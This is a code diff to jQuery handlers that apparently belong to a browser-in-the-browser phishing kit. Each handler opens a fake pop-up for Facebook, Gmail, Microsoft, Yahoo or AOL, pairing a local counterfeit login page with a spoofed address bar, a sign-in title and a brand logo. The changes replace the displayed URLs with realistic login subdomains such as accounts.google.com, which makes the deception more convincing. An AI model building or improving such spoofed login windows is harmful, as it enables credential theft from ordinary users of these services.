@@ -133,7 +133,7 @@ $("#clickme").click(function(){
 //// Pop-up appear on click with delay ////
 $("#clickme1").click(function(){
   setIframeSource("/page/facebook");
-  SeturlSource("https://facebook.com/");
+  SeturlSource("web.facebook.com/");
   SeturlTitle("Sign in your Facebook Account");
   SetImageSrc("Windows-DarkMode-Delay/index.png");
 });
@@ -141,7 +141,7 @@ $("#clickme1").click(function(){
 //// Pop-up appear on click with delay ////
 $("#clickme2").click(function(){
   setIframeSource("/page/gmail");
-  SeturlSource("https://gmail.com/");
+  SeturlSource("accounts.google.com/");
   SeturlTitle("Sign in your Gmail Account");
   SetImageSrc("Windows-DarkMode-Delay/Google_'G'_Logo.svg.png");
 });
@@ -149,20 +149,20 @@ $("#clickme2").click(function(){
 //// Pop-up appear on click with delay ////
 $("#clickme3").click(function(){
   setIframeSource("/page/microsoft")
-  SeturlSource("https://microsoft.com/")
+  SeturlSource("login.microsoft.com/")
   SeturlTitle("Sign in your Microsoft Account");
   SetImageSrc("Windows-DarkMode-Delay/microsoft.png");
 });
 
 $("#clickme4").click(function(){
   setIframeSource("/page/yahoo")
-  SeturlSource("https://yahoo.com/")
+  SeturlSource("login.yahoo.com/")
   SeturlTitle("Sign in your Yahoo Account");
   SetImageSrc("Windows-DarkMode-Delay/Yahoo.png");
 });
 $("#clickme5").click(function(){
   setIframeSource("/page/aol");
-  SeturlSource("https://login.aol.com/");
+  SeturlSource("login.aol.com/");
   SeturlTitle("Sign in your Aol Account");
   SetImageSrc("Windows-DarkMode-Delay/apple-1.png");
 });
